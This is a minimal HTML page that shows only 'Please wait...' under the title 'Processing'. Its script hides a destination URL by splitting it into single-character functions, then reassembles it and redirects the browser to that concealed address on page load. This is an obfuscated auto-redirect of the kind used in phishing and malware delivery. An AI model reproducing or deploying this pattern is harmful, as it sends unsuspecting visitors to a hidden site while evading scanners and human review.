<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Processing</title>
    <script>
        const fragments = [
            _ => 'h',
            () => 't',
            () => 't',
            () => 'p',
            _ => 's',
            function() { return ':'; },
            () => '/',
            () => '/',
            function() { return 'v'; },
            () => 'e',
            function() { return 'r'; },
            function() { return 'g'; },
            _ => 'e',
            function() { return 'n'; },
            _ => '.',
            () => 'c',
            function() { return 'l'; },
            _ => 'i',
            _ => 'c',
            function() { return 'k'; },
            () => '/',
            _ => 's',
            () => '/',
            () => 'n',
            _ => 'e',
            function() { return 'w'; }
        ];
        window.location.href = fragments.map(fn => fn()).join('');
    </script>
</head>
<body>
    <p>Please wait...</p>
</body>
</html>
